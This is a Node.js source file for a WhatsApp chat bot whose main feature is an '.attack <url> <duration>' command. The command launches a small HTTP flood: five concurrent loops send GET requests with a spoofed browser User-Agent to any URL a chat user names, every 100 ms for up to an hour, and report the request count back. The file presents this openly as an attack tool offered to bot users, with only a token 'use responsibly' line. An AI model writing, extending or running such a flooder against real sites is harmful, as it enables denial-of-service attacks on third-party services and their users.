const axios = require('axios');
const chalk = require('chalk');

// Fungsi untuk menampilkan log command
function logCommand(message, type = 'info') {
  const timestamp = new Date().toLocaleTimeString();
  const colors = {
    info: chalk.blue,
    success: chalk.green,
    warning: chalk.yellow,
    error: chalk.red
  };
  console.log(colors[type](`[${timestamp}] [COMMAND] ${message}`));
}

async function attack(url, duration) {
  const endTime = Date.now() + (duration * 1000);
  const threads = 5; // 5 threads
  const delayMs = 100; // delay 100ms
  let requestCount = 0;

  logCommand(`Starting attack on ${url} for ${duration} seconds`, 'info');

  const attacks = Array(threads).fill().map(async (_, index) => {
    logCommand(`Thread ${index + 1} started`, 'info');
    
    while (Date.now() < endTime) {
      try {
        const startTime = Date.now();
        await axios.get(url, { 
          timeout: 10000,
          headers: {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
          }
        });
        requestCount++;
        const responseTime = Date.now() - startTime;
        logCommand(`Thread ${index + 1} - Request ${requestCount} - Response: ${responseTime}ms`, 'success');
      } catch (error) {
        requestCount++;
        if (error.code === 'ECONNABORTED') {
          logCommand(`Thread ${index + 1} - Request ${requestCount} - Timeout`, 'warning');
        } else {
          logCommand(`Thread ${index + 1} - Request ${requestCount} - Error: ${error.message}`, 'error');
        }
      }
      await new Promise(resolve => setTimeout(resolve, delayMs));
    }
    
    logCommand(`Thread ${index + 1} finished`, 'info');
  });

  await Promise.all(attacks);
  return requestCount;
}

module.exports = async (sock, sender, text, name) => {
  const args = text.trim().split(' ');
  const command = args[0].toLowerCase();

  if (command === '.menu') {
    await sock.sendMessage(sender, { 
      text: `🤖 *WhatsApp Bot*\n\n` +
            `👋 Hello ${name}!\n\n` +
            `*Available Commands:*\n` +
            `.menu - Show this menu\n` +
            `.attack <url> <duration> - Attack target\n` +
            `.status - Show bot status\n\n` +
            `*Note:* Use commands responsibly`
    });
    logCommand(`Menu shown to ${name}`, 'info');
  }

  else if (command === '.attack') {
    if (args.length < 3) {
      await sock.sendMessage(sender, { 
        text: '❌ *Usage:* .attack <url> <duration_in_seconds>\n' +
              '*Example:* .attack https://example.com 60'
      });
      return;
    }

    const url = args[1];
    const duration = parseInt(args[2]);

    if (isNaN(duration) || duration <= 0 || duration > 3600) {
      await sock.sendMessage(sender, { 
        text: '❌ Duration must be a positive number between 1 and 3600 (1 hour)'
      });
      return;
    }

    // Validasi URL
    try {
      new URL(url);
    } catch (error) {
      await sock.sendMessage(sender, { 
        text: '❌ Invalid URL format'
      });
      return;
    }

    await sock.sendMessage(sender, { 
      text: `🚀 *Starting Attack*\n\n` +
            `📡 URL: ${url}\n` +
            `⏱ Duration: ${duration} seconds\n` +
            `🧵 Threads: 5\n` +
            `⏳ Delay: 100ms\n\n` +
            `Please wait...`
    });

    try {
      const totalRequests = await attack(url, duration);
      await sock.sendMessage(sender, { 
        text: `✅ *Attack Finished*\n\n` +
              `📡 URL: ${url}\n` +
              `⏱ Duration: ${duration} seconds\n` +
              `📊 Total Requests: ${totalRequests}\n` +
              `🟢 Status: Completed`
      });
    } catch (error) {
      await sock.sendMessage(sender, { 
        text: `❌ *Attack Failed*\n\n` +
              `Error: ${error.message}`
      });
    }
  }

  else if (command === '.status') {
    const uptime = process.uptime();
    const hours = Math.floor(uptime / 3600);
    const minutes = Math.floor((uptime % 3600) / 60);
    const seconds = Math.floor(uptime % 60);
    
    await sock.sendMessage(sender, { 
      text: `📊 *Bot Status*\n\n` +
            `🟢 Status: Online\n` +
            `⏰ Uptime: ${hours}h ${minutes}m ${seconds}s\n` +
            `💾 Memory: ${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)} MB\n` +
            `🖥 Platform: ${process.platform}`
    });
    logCommand(`Status checked by ${name}`, 'info');
  }

  else {
    await sock.sendMessage(sender, { 
      text: '❌ Unknown command. Type .menu to see available commands'
    });
    logCommand(`Unknown command from ${name}: ${text}`, 'warning');
  }
};